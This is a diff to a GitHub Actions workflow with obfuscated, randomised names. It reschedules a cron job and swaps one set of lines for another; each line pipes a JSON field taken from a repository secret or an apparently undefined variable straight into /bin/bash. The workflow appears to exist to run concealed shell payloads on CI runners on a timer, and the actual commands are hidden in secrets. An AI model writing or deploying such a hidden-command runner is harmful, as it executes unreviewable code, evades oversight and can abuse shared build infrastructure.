@@ -1,9 +1,8 @@
 name: xuezhongpaof
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '43 3/6 * * *'
 
 jobs:
   build:
@@ -13,20 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: xuezhongpaof
         env:
-          s25735: ${{ secrets.s25735 }}
+          grqt275: ${{ secrets.grqt275 }}
         run: |
-          echo $s25735 | jq -r .yodxt7 | /bin/bash
-          echo $on11 | jq -r .wkh40620 | /bin/bash
-          echo $tx0 | jq -r .hu18800 | /bin/bash
-          echo $o0261 | jq -r .rmqty8783 | /bin/bash
-          echo $b548 | jq -r .jdubr446 | /bin/bash
-          echo $qpyd8272 | jq -r .eaxjg1307 | /bin/bash
-          echo $rmyiu76477 | jq -r .u028 | /bin/bash
-          echo $t99 | jq -r .ca793 | /bin/bash
-          echo $ima8 | jq -r .wpue2 | /bin/bash
-          echo $srsg57 | jq -r .a9 | /bin/bash
-          echo $on8 | jq -r .nes2 | /bin/bash
-          echo $eas7897 | jq -r .xq1218 | /bin/bash
-          echo $qlfpu6 | jq -r .re63 | /bin/bash
-          echo $smqay30 | jq -r .ezb17881 | /bin/bash
+          echo $grqt275 | jq -r .grvkp7577 | /bin/bash
+          echo $utj877 | jq -r .ymk9 | /bin/bash
+          echo $vh3 | jq -r .nbpv24 | /bin/bash
+          echo $bah3 | jq -r .cb1258 | /bin/bash
+          echo $yeh78 | jq -r .yu96147 | /bin/bash
 
